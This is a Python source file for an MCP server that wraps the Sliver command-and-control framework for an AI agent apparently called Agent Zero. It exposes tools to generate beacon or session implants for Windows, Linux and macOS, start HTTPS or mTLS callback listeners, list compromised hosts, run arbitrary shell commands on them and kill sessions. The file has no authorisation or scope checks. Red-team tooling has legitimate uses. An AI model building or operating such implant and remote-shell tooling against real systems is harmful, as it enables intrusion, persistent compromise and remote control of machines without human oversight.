"""
Sliver C2 MCP Server — Command & Control via BishopFox Sliver

Wraps the Sliver gRPC/HTTP API to give Agent Zero C2 management capabilities:
  - generate_implant : build a Sliver beacon/session implant (exe, elf, dll, etc.)
  - list_sessions    : list active Sliver sessions
  - interact_session : run a shell command on an active session
  - start_listener   : start an HTTP/HTTPS/mTLS listener
  - kill_session     : close a session

Environment:
  SLIVER_HOST      : Sliver server hostname (default: sliver)
  SLIVER_HTTP_PORT : Sliver HTTP multiplayer port (default: 8888)
  SLIVER_API_TOKEN : Bearer token for Sliver operator API (default: from /root/.sliver/configs)
"""

import os
import json
import logging
import subprocess
from typing import Optional
from fastmcp import FastMCP

logger = logging.getLogger(__name__)

SERVER_NAME = "sliver"
SERVER_HOST = os.getenv("MCP_HOST", "0.0.0.0")
SERVER_PORT = int(os.getenv("SLIVER_MCP_PORT", "8019"))

SLIVER_HOST = os.getenv("SLIVER_HOST", "sliver")
SLIVER_HTTP_PORT = os.getenv("SLIVER_HTTP_PORT", "8888")
SLIVER_API_TOKEN = os.getenv("SLIVER_API_TOKEN", "")
SLIVER_CONFIG = os.getenv("SLIVER_CONFIG", "/root/.sliver-client/configs/operator.cfg")

mcp = FastMCP(SERVER_NAME)


def _sliver_client_available() -> bool:
    """Check if sliver-client binary is available."""
    try:
        result = subprocess.run(["which", "sliver-client"], capture_output=True, timeout=5)
        return result.returncode == 0
    except Exception:
        return False


def _run_sliver_cmd(args: list[str], timeout: int = 60) -> dict:
    """
    Run a sliver-client command and return {'output': str, 'success': bool}.
    Falls back to HTTP API if sliver-client is not installed.
    """
    if _sliver_client_available():
        try:
            cmd = ["sliver-client", "--config", SLIVER_CONFIG] + args
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return {
                "output": result.stdout + result.stderr,
                "success": result.returncode == 0,
            }
        except subprocess.TimeoutExpired:
            return {"output": "Command timed out", "success": False}
        except Exception as e:
            return {"output": str(e), "success": False}
    else:
        return {
            "output": (
                "sliver-client not installed in this container. "
                "To use Sliver C2, enable the 'sliver' Docker Compose profile: "
                "docker compose --profile sliver up -d sliver. "
                f"Then access the Sliver multiplayer API at http://{SLIVER_HOST}:{SLIVER_HTTP_PORT}."
            ),
            "success": False,
        }


@mcp.tool()
def generate_implant(
    lhost: str,
    lport: int = 443,
    implant_format: str = "exe",
    os_type: str = "windows",
    arch: str = "amd64",
    implant_type: str = "beacon",
    beacon_interval: int = 60,
    beacon_jitter: int = 30,
    save_path: str = "/opt/output/implant",
) -> str:
    """
    Generate a Sliver C2 implant (beacon or session).

    Args:
        lhost: Callback IP/hostname for the implant (your C2 server IP)
        lport: Callback port (default 443 for HTTPS)
        implant_format: Output format — exe, elf, dll, dylib, shellcode (default: exe)
        os_type: Target OS — windows, linux, darwin (default: windows)
        arch: Target architecture — amd64, arm64, 386 (default: amd64)
        implant_type: beacon (sleep-based callback) or session (interactive) (default: beacon)
        beacon_interval: Beacon sleep interval in seconds (default: 60)
        beacon_jitter: Beacon jitter ±seconds for OPSEC (default: 30)
        save_path: Output file path inside the container
    """
    if implant_type == "beacon":
        args = [
            "generate", "beacon",
            "--http", f"{lhost}:{lport}",
            "--os", os_type,
            "--arch", arch,
            "--format", implant_format,
            "--interval", str(beacon_interval),
            "--jitter", str(beacon_jitter),
            "--save", save_path,
        ]
    else:
        args = [
            "generate",
            "--http", f"{lhost}:{lport}",
            "--os", os_type,
            "--arch", arch,
            "--format", implant_format,
            "--save", save_path,
        ]
    result = _run_sliver_cmd(args, timeout=120)
    return json.dumps(result)


@mcp.tool()
def list_sessions() -> str:
    """
    List all active Sliver sessions and beacons.
    Returns session IDs, hostnames, OS, user, and last check-in time.
    """
    sessions_result = _run_sliver_cmd(["sessions", "--json"], timeout=30)
    beacons_result = _run_sliver_cmd(["beacons", "--json"], timeout=30)
    return json.dumps({
        "sessions": sessions_result,
        "beacons": beacons_result,
    })


@mcp.tool()
def interact_session(session_id: str, command: str, timeout: int = 30) -> str:
    """
    Execute a shell command on an active Sliver session.

    Args:
        session_id: Sliver session ID (from list_sessions)
        command: Shell command to execute on the target
        timeout: Command timeout in seconds (default: 30)
    """
    result = _run_sliver_cmd(
        ["use", session_id, "--", "shell", "--command", command],
        timeout=timeout + 10,
    )
    return json.dumps(result)


@mcp.tool()
def start_listener(
    listener_type: str = "https",
    lhost: str = "0.0.0.0",
    lport: int = 443,
    domain: Optional[str] = None,
) -> str:
    """
    Start a Sliver C2 listener.

    Args:
        listener_type: http, https, or mtls (default: https)
        lhost: Bind host (default: 0.0.0.0)
        lport: Bind port (default: 443)
        domain: Optional domain for HTTPS certificate (SNI)
    """
    args = [listener_type, "--lhost", lhost, "--lport", str(lport)]
    if domain and listener_type == "https":
        args += ["--domain", domain]
    result = _run_sliver_cmd(args, timeout=30)
    return json.dumps(result)


@mcp.tool()
def kill_session(session_id: str, force: bool = False) -> str:
    """
    Terminate a Sliver session.

    Args:
        session_id: Session ID to kill
        force: Force kill without graceful teardown
    """
    args = ["use", session_id, "--", "kill"]
    if force:
        args.append("--force")
    result = _run_sliver_cmd(args, timeout=15)
    return json.dumps(result)


if __name__ == "__main__":
    transport = os.getenv("MCP_TRANSPORT", "sse")
    mcp.run(transport=transport, host=SERVER_HOST, port=SERVER_PORT)
